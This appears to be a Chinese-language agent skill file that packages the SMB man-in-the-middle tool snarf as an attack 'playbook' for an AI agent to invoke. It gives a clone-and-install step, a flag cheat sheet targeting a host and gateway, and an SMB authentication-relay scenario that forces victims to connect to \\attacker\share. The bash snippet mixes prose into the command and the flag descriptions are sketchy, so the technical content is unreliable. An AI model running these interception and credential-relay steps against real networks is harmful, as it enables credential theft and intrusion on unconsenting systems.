---
name: snarf-mitm-smb
description: 渗透工具 skill:snarf 的安装、参数速查与攻击场景 playbook。当任务涉及 嗅探与中间人攻击 需要调用 snarf 时使用。
---

# snarf

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/purpleteam/snarf
- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/purpleteam/snarf && cd snarf
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `node snarf.js -i eth0 -t 10.0.0.5` | SMB 中间人 |
| `-i eth0 -g` | 网关 |
| `-l` | 监听 |

## 攻击场景 Playbook

### SMB 认证中继

```bash
node snarf.js -i eth0 && 目标访问 \\attacker\share
# 强制认证中继
```

## 注意事项

SMB 中间人+强制认证工具。
